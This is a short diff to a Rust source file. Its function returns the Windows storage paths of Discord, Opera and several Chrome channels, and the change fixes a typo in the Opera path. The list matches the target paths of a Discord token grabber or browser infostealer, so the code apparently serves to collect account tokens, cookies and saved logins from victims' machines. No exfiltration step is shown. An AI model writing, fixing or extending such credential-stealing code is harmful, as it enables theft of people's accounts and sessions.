@@ -37,7 +37,7 @@ pub fn get() -> Vec<String> {
         format!("{}\\discord", roaming),                          // Discord
         format!("{}\\discordcanary", roaming),                    // Discord Canary
         format!("{}\\discordptb", roaming),                       // Discord PTB
-        format!("{}\\Opera Software\\Opera Stable'", roaming),    // Opera
+        format!("{}\\Opera Software\\Opera Stable", roaming),    // Opera
         format!("{}\\Google\\Chrome\\User Data\\Default", local), // Google Chrome
         format!("{}\\Google\\Chrome Beta\\User Data\\Default", local), // Google Chrome Beta
         format!("{}\\Google\\Chrome SxS\\User Data\\Default", local), // Google Chrome Canary
